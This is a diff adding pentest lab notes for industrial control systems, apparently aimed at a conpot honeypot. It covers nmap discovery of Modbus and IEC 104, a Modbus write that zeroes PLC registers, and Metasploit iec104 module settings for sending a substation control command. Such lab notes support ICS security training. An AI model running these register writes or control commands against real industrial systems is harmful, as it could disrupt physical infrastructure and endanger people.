@@ -36,4 +36,30 @@ I20200 1 In-Tank Delivery Report \
 I20300 1 In-Tank Leak Detect Report \
 I20400 1 In-Tank Shift Inventory Report \
 I20500 1 In-Tank Status Report
+
+## Modbus PLC Simulation
+sudo nmap -Pn 192.168.168.12 -p 502 --script ~/ICS_attack_scripts/Redpoint/modbus-discover.nse
+metasploit modules -> search modbus
+
+modbus read 192.168.168.12 %MW0 10
+modbus write 192.168.168.12 %MW0 0 0 0 0 0 0 0 0 0 
+
+## Pentesting a ChronoGuard Infrastructure Substation
+Change the first half part of the MAC address to 001D59 \
+nano .local/lib/python3.10/site-packages/conpot/templates/IEC104/snmp/snmp.xml \
+Change the snmp port from 161 into 16100 \
+conpot -f --template IEC104 \
+sudo nmap 192.168.168.12 -p 2404 --script ~/ICS_attack_scripts/Redpoint/iec-identify.nse \
+metasploit -> search iec104 \
+use auxiliary/client/iec104/iec104 \
+set ASDU_ADDRESS <learn_from_nmap_nse> \
+check the ChronoGuard manual \
+ASDU_ADDRESS 7720 \
+COMMAND_ADDRESS 3348 \
+COMMAND_TYPE 45 \
+COMMAND_VALUE 0
+
+
+
+
   
